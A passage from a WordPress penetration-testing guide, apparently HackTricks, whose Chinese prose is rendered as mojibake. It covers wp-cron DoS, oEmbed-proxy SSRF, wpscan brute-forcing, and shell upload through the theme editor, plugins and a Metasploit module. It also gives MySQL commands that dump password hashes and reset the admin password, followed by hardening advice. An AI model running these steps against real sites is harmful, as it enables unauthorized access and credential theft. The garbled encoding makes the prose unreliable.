<p>æ­¤æ–‡ä»¶é€šå¸¸ä½äºWordpressç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹ï¼š<strong><code>/wp-cron.php</code></strong><br />
å½“æ­¤æ–‡ä»¶è¢«<strong>è®¿é—®</strong>æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªâ€œ<strong>é‡</strong>â€çš„MySQL <strong>æŸ¥è¯¢</strong>ï¼Œå› æ­¤å¯èƒ½è¢«<strong>æ”»å‡»è€…</strong>ç”¨æ¥<strong>é€ æˆ****DoS</strong>ã€‚<br />
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>wp-cron.php</code>åœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶è¢«è°ƒç”¨ï¼ˆæ¯å½“å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½•Wordpressé¡µé¢æ—¶ï¼‰ï¼Œåœ¨é«˜æµé‡ç½‘ç«™ä¸Šå¯èƒ½ä¼šå¯¼è‡´é—®é¢˜ï¼ˆDoSï¼‰ã€‚</p>
<p>å»ºè®®ç¦ç”¨Wp-Cronï¼Œå¹¶åœ¨ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªçœŸæ­£çš„cronjobï¼Œä»¥å®šæœŸæ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆè€Œä¸é€ æˆé—®é¢˜ï¼‰ã€‚</p>
<h3 id="wp-jsonoembed10proxy---ssrf"><a class="header" href="#wp-jsonoembed10proxy---ssrf">/wp-json/oembed/1.0/proxy - SSRF</a></h3>
<p>å°è¯•è®¿é—®_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWordpressç«™ç‚¹å¯èƒ½ä¼šå‘æ‚¨å‘å‡ºè¯·æ±‚ã€‚</p>
<p>å½“å®ƒä¸èµ·ä½œç”¨æ—¶çš„å“åº”æ˜¯ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(365).png" alt="" /></p>
<h2 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h2>
<p>{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}</p>
<p>æ­¤å·¥å…·æ£€æŸ¥<strong>methodName: pingback.ping</strong>å’Œè·¯å¾„**/wp-json/oembed/1.0/proxy**ï¼Œå¦‚æœå­˜åœ¨ï¼Œå®ƒä¼šå°è¯•åˆ©ç”¨å®ƒä»¬ã€‚</p>
<h2 id="è‡ªåŠ¨å·¥å…·"><a class="header" href="#è‡ªåŠ¨å·¥å…·">è‡ªåŠ¨å·¥å…·</a></h2>
<pre><code class="language-bash">cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token &lt;API_TOKEN&gt; --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
</code></pre>
<h2 id="é€šè¿‡è¦†ç›–ä¸€ä¸ªæ¯”ç‰¹è·å–è®¿é—®æƒé™"><a class="header" href="#é€šè¿‡è¦†ç›–ä¸€ä¸ªæ¯”ç‰¹è·å–è®¿é—®æƒé™">é€šè¿‡è¦†ç›–ä¸€ä¸ªæ¯”ç‰¹è·å–è®¿é—®æƒé™</a></h2>
<p>è¿™ä¸ä»…ä»…æ˜¯ä¸€æ¬¡çœŸæ­£çš„æ”»å‡»ï¼Œè€Œæ˜¯ä¸€ç§å¥½å¥‡å¿ƒã€‚åœ¨ CTF <a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man">https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man</a> ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ä»»ä½• wordpress æ–‡ä»¶çš„ 1 ä¸ªæ¯”ç‰¹ã€‚å› æ­¤ï¼Œä½ å¯ä»¥å°†æ–‡ä»¶ <code>/var/www/html/wp-includes/user.php</code> çš„ä½ç½® <code>5389</code> ç¿»è½¬ä¸º NOP NOT (<code>!</code>) æ“ä½œã€‚</p>
<pre><code class="language-php">if ( ! wp_check_password( $password, $user-&gt;user_pass, $user-&gt;ID ) ) {
return new WP_Error(
</code></pre>
<h2 id="é¢æ¿-rce"><a class="header" href="#é¢æ¿-rce"><strong>é¢æ¿ RCE</strong></a></h2>
<p><strong>ä¿®æ”¹æ‰€ç”¨ä¸»é¢˜çš„ phpï¼ˆéœ€è¦ç®¡ç†å‘˜å‡­æ®ï¼‰</strong></p>
<p>å¤–è§‚ â†’ ä¸»é¢˜ç¼–è¾‘å™¨ â†’ 404 æ¨¡æ¿ï¼ˆåœ¨å³ä¾§ï¼‰</p>
<p>å°†å†…å®¹æ›´æ”¹ä¸º php shellï¼š</p>
<p><img src="../../.gitbook/assets/image%20(384).png" alt="" /></p>
<p>åœ¨äº’è”ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®è¯¥æ›´æ–°é¡µé¢ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¿…é¡»è®¿é—®è¿™é‡Œ: <a href="http://10.11.1.234/wp-content/themes/twentytwelve/404.php">http://10.11.1.234/wp-content/themes/twentytwelve/404.php</a></p>
<h3 id="msf"><a class="header" href="#msf">MSF</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ï¼š</p>
<pre><code class="language-bash">use exploit/unix/webapp/wp_admin_shell_upload
</code></pre>
<p>to get a session.</p>
<h2 id="æ’ä»¶-rce"><a class="header" href="#æ’ä»¶-rce">æ’ä»¶ RCE</a></h2>
<h3 id="php-æ’ä»¶"><a class="header" href="#php-æ’ä»¶">PHP æ’ä»¶</a></h3>
<p>å¯èƒ½å¯ä»¥å°† .php æ–‡ä»¶ä½œä¸ºæ’ä»¶ä¸Šä¼ ã€‚<br />
ä½¿ç”¨ä¾‹å¦‚ä»¥ä¸‹æ–¹æ³•åˆ›å»ºä½ çš„ php åé—¨ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(183).png" alt="" /></p>
<p>ç„¶åæ·»åŠ ä¸€ä¸ªæ–°æ’ä»¶ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(722).png" alt="" /></p>
<p>ä¸Šä¼ æ’ä»¶å¹¶æŒ‰â€œç«‹å³å®‰è£…â€ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(249).png" alt="" /></p>
<p>ç‚¹å‡»ç»§ç»­ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(70).png" alt="" /></p>
<p>è¿™å¯èƒ½çœ‹èµ·æ¥æ²¡æœ‰ä»»ä½•ååº”ï¼Œä½†å¦‚æœä½ å»åª’ä½“ï¼Œä½ ä¼šçœ‹åˆ°ä½ çš„ shell å·²ä¸Šä¼ ï¼š</p>
<p><img src="../../.gitbook/assets/image%20(462).png" alt="" /></p>
<p>è®¿é—®å®ƒï¼Œä½ å°†çœ‹åˆ°æ‰§è¡Œåå‘ shell çš„ URLï¼š</p>
<p><img src="../../.gitbook/assets/image%20(1006).png" alt="" /></p>
<h3 id="ä¸Šä¼ å’Œæ¿€æ´»æ¶æ„æ’ä»¶"><a class="header" href="#ä¸Šä¼ å’Œæ¿€æ´»æ¶æ„æ’ä»¶">ä¸Šä¼ å’Œæ¿€æ´»æ¶æ„æ’ä»¶</a></h3>
<p>æ­¤æ–¹æ³•æ¶‰åŠå®‰è£…å·²çŸ¥å­˜åœ¨æ¼æ´çš„æ¶æ„æ’ä»¶ï¼Œå¹¶å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è·å– web shellã€‚æ­¤è¿‡ç¨‹é€šè¿‡ WordPress ä»ªè¡¨æ¿è¿›è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<ol>
<li><strong>æ’ä»¶è·å–</strong>ï¼šä»åƒ Exploit DB è¿™æ ·çš„æ¥æºè·å–æ’ä»¶ï¼Œå¦‚ <a href="https://www.exploit-db.com/exploits/36374"><strong>è¿™é‡Œ</strong></a>ã€‚</li>
<li><strong>æ’ä»¶å®‰è£…</strong>ï¼š</li>
</ol>
<ul>
<li>å¯¼èˆªåˆ° WordPress ä»ªè¡¨æ¿ï¼Œç„¶åè½¬åˆ° <code>ä»ªè¡¨æ¿ &gt; æ’ä»¶ &gt; ä¸Šä¼ æ’ä»¶</code>ã€‚</li>
<li>ä¸Šä¼ ä¸‹è½½æ’ä»¶çš„ zip æ–‡ä»¶ã€‚</li>
</ul>
<ol start="3">
<li><strong>æ’ä»¶æ¿€æ´»</strong>ï¼šä¸€æ—¦æ’ä»¶æˆåŠŸå®‰è£…ï¼Œå¿…é¡»é€šè¿‡ä»ªè¡¨æ¿æ¿€æ´»å®ƒã€‚</li>
<li><strong>åˆ©ç”¨</strong>ï¼š</li>
</ol>
<ul>
<li>å®‰è£…å¹¶æ¿€æ´»æ’ä»¶â€œreflex-galleryâ€ï¼Œå¯ä»¥åˆ©ç”¨å®ƒï¼Œå› ä¸ºå·²çŸ¥å­˜åœ¨æ¼æ´ã€‚</li>
<li>Metasploit æ¡†æ¶æä¾›äº†æ­¤æ¼æ´çš„åˆ©ç”¨ã€‚é€šè¿‡åŠ è½½é€‚å½“çš„æ¨¡å—å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼Œå¯ä»¥å»ºç«‹ meterpreter ä¼šè¯ï¼Œä»è€Œè·å¾—å¯¹ç«™ç‚¹çš„æœªç»æˆæƒè®¿é—®ã€‚</li>
<li>æ³¨æ„ï¼Œè¿™åªæ˜¯åˆ©ç”¨ WordPress ç½‘ç«™çš„ä¼—å¤šæ–¹æ³•ä¹‹ä¸€ã€‚</li>
</ul>
<p>å†…å®¹åŒ…æ‹¬æè¿°åœ¨ WordPress ä»ªè¡¨æ¿ä¸­å®‰è£…å’Œæ¿€æ´»æ’ä»¶æ­¥éª¤çš„è§†è§‰è¾…åŠ©å·¥å…·ã€‚ç„¶è€Œï¼Œé‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œä»¥è¿™ç§æ–¹å¼åˆ©ç”¨æ¼æ´åœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹æ˜¯éæ³•å’Œä¸é“å¾·çš„ã€‚æ­¤ä¿¡æ¯åº”è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œä»…åœ¨æ³•å¾‹èƒŒæ™¯ä¸‹ä½¿ç”¨ï¼Œä¾‹å¦‚åœ¨è·å¾—æ˜ç¡®è®¸å¯çš„æ¸—é€æµ‹è¯•ä¸­ã€‚</p>
<p><strong>æœ‰å…³æ›´è¯¦ç»†çš„æ­¥éª¤ï¼Œè¯·æŸ¥çœ‹ï¼š</strong> <a href="https://www.hackingarticles.in/wordpress-reverse-shell/"><strong>https://www.hackingarticles.in/wordpress-reverse-shell/</strong></a></p>
<h2 id="ä»-xss-åˆ°-rce"><a class="header" href="#ä»-xss-åˆ°-rce">ä» XSS åˆ° RCE</a></h2>
<ul>
<li><a href="https://github.com/nowak0x01/WPXStrike"><strong>WPXStrike</strong></a>ï¼š<em><strong>WPXStrike</strong></em> æ˜¯ä¸€ä¸ªæ—¨åœ¨å°† <strong>è·¨ç«™è„šæœ¬ (XSS)</strong> æ¼æ´å‡çº§ä¸º <strong>è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)</strong> æˆ–å…¶ä»– WordPress ä¸­çš„å…³é”®æ¼æ´çš„è„šæœ¬ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ <a href="https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html"><strong>æ­¤å¸–å­</strong></a>ã€‚å®ƒæä¾›å¯¹ WordPress ç‰ˆæœ¬ 6.X.Xã€5.X.X å’Œ 4.X.X çš„ <strong>æ”¯æŒï¼Œå¹¶å…è®¸ï¼š</strong></li>
<li><em><strong>æƒé™æå‡ï¼š</strong></em> åœ¨ WordPress ä¸­åˆ›å»ºç”¨æˆ·ã€‚</li>
<li><em><strong>(RCE) è‡ªå®šä¹‰æ’ä»¶ (åé—¨) ä¸Šä¼ ï¼š</strong></em> å°†è‡ªå®šä¹‰æ’ä»¶ (åé—¨) ä¸Šä¼ åˆ° WordPressã€‚</li>
<li><em><strong>(RCE) å†…ç½®æ’ä»¶ç¼–è¾‘ï¼š</strong></em> ç¼–è¾‘ WordPress ä¸­çš„å†…ç½®æ’ä»¶ã€‚</li>
<li><em><strong>(RCE) å†…ç½®ä¸»é¢˜ç¼–è¾‘ï¼š</strong></em> ç¼–è¾‘ WordPress ä¸­çš„å†…ç½®ä¸»é¢˜ã€‚</li>
<li><em><strong>(è‡ªå®šä¹‰) è‡ªå®šä¹‰åˆ©ç”¨ï¼š</strong></em> é’ˆå¯¹ç¬¬ä¸‰æ–¹ WordPress æ’ä»¶/ä¸»é¢˜çš„è‡ªå®šä¹‰åˆ©ç”¨ã€‚</li>
</ul>
<h2 id="åˆ©ç”¨å"><a class="header" href="#åˆ©ç”¨å">åˆ©ç”¨å</a></h2>
<p>æå–ç”¨æˆ·åå’Œå¯†ç ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">mysql -u &lt;USERNAME&gt; --password=&lt;PASSWORD&gt; -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
</code></pre>
<p>{% endcode %}</p>
<p>æ›´æ”¹ç®¡ç†å‘˜å¯†ç ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">mysql -u &lt;USERNAME&gt; --password=&lt;PASSWORD&gt; -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
</code></pre>
<p>{% endcode %}</p>
<h2 id="wordpress-æ’ä»¶æ¸—é€æµ‹è¯•"><a class="header" href="#wordpress-æ’ä»¶æ¸—é€æµ‹è¯•">Wordpress æ’ä»¶æ¸—é€æµ‹è¯•</a></h2>
<h3 id="æ”»å‡»é¢"><a class="header" href="#æ”»å‡»é¢">æ”»å‡»é¢</a></h3>
<p>äº†è§£ Wordpress æ’ä»¶å¦‚ä½•æš´éœ²åŠŸèƒ½æ˜¯å‘ç°å…¶åŠŸèƒ½æ¼æ´çš„å…³é”®ã€‚æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹è¦ç‚¹ä¸­æ‰¾åˆ°æ’ä»¶å¯èƒ½æš´éœ²åŠŸèƒ½çš„æ–¹å¼ï¼Œä»¥åŠä¸€äº›æ˜“å—æ”»å‡»æ’ä»¶çš„ç¤ºä¾‹ï¼Œè¯¦è§ <a href="https://nowotarski.info/wordpress-nonce-authorization/"><strong>è¿™ç¯‡åšå®¢æ–‡ç« </strong></a>ã€‚</p>
<ul>
<li><strong><code>wp_ajax</code></strong> </li>
</ul>
<p>æ’ä»¶æš´éœ²åŠŸèƒ½çš„ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡ AJAX å¤„ç†ç¨‹åºã€‚è¿™äº›å¤„ç†ç¨‹åºå¯èƒ½åŒ…å«é€»è¾‘ã€æˆæƒæˆ–èº«ä»½éªŒè¯æ¼æ´ã€‚æ­¤å¤–ï¼Œè¿™äº›åŠŸèƒ½é€šå¸¸ä¼šåŸºäº Wordpress nonce çš„å­˜åœ¨è¿›è¡Œèº«ä»½éªŒè¯å’Œæˆæƒï¼Œè€Œ <strong>ä»»ä½•åœ¨ Wordpress å®ä¾‹ä¸­ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·éƒ½å¯èƒ½æ‹¥æœ‰</strong>ï¼ˆä¸å…¶è§’è‰²æ— å…³ï¼‰ã€‚</p>
<p>è¿™äº›æ˜¯å¯ä»¥ç”¨æ¥åœ¨æ’ä»¶ä¸­æš´éœ²åŠŸèƒ½çš„å‡½æ•°ï¼š</p>
<pre><code class="language-php">add_action( 'wp_ajax_action_name', array(&amp;$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&amp;$this, 'function_name'));
</code></pre>
<p><strong>ä½¿ç”¨ <code>nopriv</code> ä½¿å¾—è¯¥ç«¯ç‚¹å¯ä»¥è¢«ä»»ä½•ç”¨æˆ·è®¿é—®ï¼ˆç”šè‡³æ˜¯æœªè®¤è¯çš„ç”¨æˆ·ï¼‰ã€‚</strong></p>
<p>{% hint style="danger" %}
æ­¤å¤–ï¼Œå¦‚æœè¯¥å‡½æ•°åªæ˜¯ä½¿ç”¨ <code>wp_verify_nonce</code> æ£€æŸ¥ç”¨æˆ·çš„æˆæƒï¼Œè¯¥å‡½æ•°ä»…æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œé€šå¸¸å¹¶ä¸æ£€æŸ¥ç”¨æˆ·çš„è§’è‰²ã€‚å› æ­¤ï¼Œä½æƒé™ç”¨æˆ·å¯èƒ½ä¼šè®¿é—®é«˜æƒé™çš„æ“ä½œã€‚
{% endhint %}</p>
<ul>
<li><strong>REST API</strong></li>
</ul>
<p>è¿˜å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>register_rest_route</code> å‡½æ•°ä» WordPress æ³¨å†Œä¸€ä¸ª REST API æ¥æš´éœ²å‡½æ•°ï¼š</p>
<pre><code class="language-php">register_rest_route(
$this-&gt;namespace, '/get/', array(
'methods' =&gt; WP_REST_Server::READABLE,
'callback' =&gt; array($this, 'getData'),
'permission_callback' =&gt; '__return_true'
)
);
</code></pre>
<p><code>permission_callback</code> æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç»™å®šç”¨æˆ·æ˜¯å¦æœ‰æƒè°ƒç”¨ API æ–¹æ³•ã€‚</p>
<p><strong>å¦‚æœä½¿ç”¨å†…ç½®çš„ <code>__return_true</code> å‡½æ•°ï¼Œå®ƒå°†ç®€å•åœ°è·³è¿‡ç”¨æˆ·æƒé™æ£€æŸ¥ã€‚</strong></p>
<ul>
<li><strong>ç›´æ¥è®¿é—® php æ–‡ä»¶</strong></li>
</ul>
<p>å½“ç„¶ï¼ŒWordpress ä½¿ç”¨ PHPï¼Œæ’ä»¶ä¸­çš„æ–‡ä»¶å¯ä»¥ç›´æ¥ä»ç½‘ç»œè®¿é—®ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªæ’ä»¶æš´éœ²äº†ä»»ä½•é€šè¿‡è®¿é—®æ–‡ä»¶è§¦å‘çš„è„†å¼±åŠŸèƒ½ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥åˆ©ç”¨å®ƒã€‚</p>
<h2 id="wordpress-ä¿æŠ¤"><a class="header" href="#wordpress-ä¿æŠ¤">WordPress ä¿æŠ¤</a></h2>
<h3 id="å®šæœŸæ›´æ–°"><a class="header" href="#å®šæœŸæ›´æ–°">å®šæœŸæ›´æ–°</a></h3>
<p>ç¡®ä¿ WordPressã€æ’ä»¶å’Œä¸»é¢˜æ˜¯æœ€æ–°çš„ã€‚è¿˜è¦ç¡®è®¤åœ¨ wp-config.php ä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š</p>
<pre><code class="language-bash">define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
</code></pre>
<p>ä¹Ÿ<strong>åªå®‰è£…å¯ä¿¡çš„ WordPress æ’ä»¶å’Œä¸»é¢˜</strong>ã€‚</p>
<h3 id="å®‰å…¨æ’ä»¶"><a class="header" href="#å®‰å…¨æ’ä»¶">å®‰å…¨æ’ä»¶</a></h3>
<ul>
<li><a href="https://wordpress.org/plugins/wordfence/"><strong>Wordfence Security</strong></a></li>
<li><a href="https://wordpress.org/plugins/sucuri-scanner/"><strong>Sucuri Security</strong></a></li>
<li><a href="https://wordpress.org/plugins/better-wp-security/"><strong>iThemes Security</strong></a></li>
</ul>
<h3 id="å…¶ä»–å»ºè®®"><a class="header" href="#å…¶ä»–å»ºè®®"><strong>å…¶ä»–å»ºè®®</strong></a></h3>
<ul>
<li>åˆ é™¤é»˜è®¤çš„ <strong>admin</strong> ç”¨æˆ·</li>
<li>ä½¿ç”¨ <strong>å¼ºå¯†ç </strong> å’Œ <strong>åŒå› ç´ è®¤è¯</strong></li>
<li>å®šæœŸ <strong>å®¡æŸ¥</strong> ç”¨æˆ· <strong>æƒé™</strong></li>
<li><strong>é™åˆ¶ç™»å½•å°è¯•</strong> ä»¥é˜²æ­¢æš´åŠ›ç ´è§£æ”»å‡»</li>
<li>é‡å‘½å <strong><code>wp-admin.php</code></strong> æ–‡ä»¶ï¼Œå¹¶ä»…å…è®¸å†…éƒ¨æˆ–ç‰¹å®š IP åœ°å€è®¿é—®ã€‚</li>
</ul>
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=wordpress"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=wordpress" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/pentesting-web/werkzeug.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-kerberos-88/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/pentesting-web/werkzeug.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-kerberos-88/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
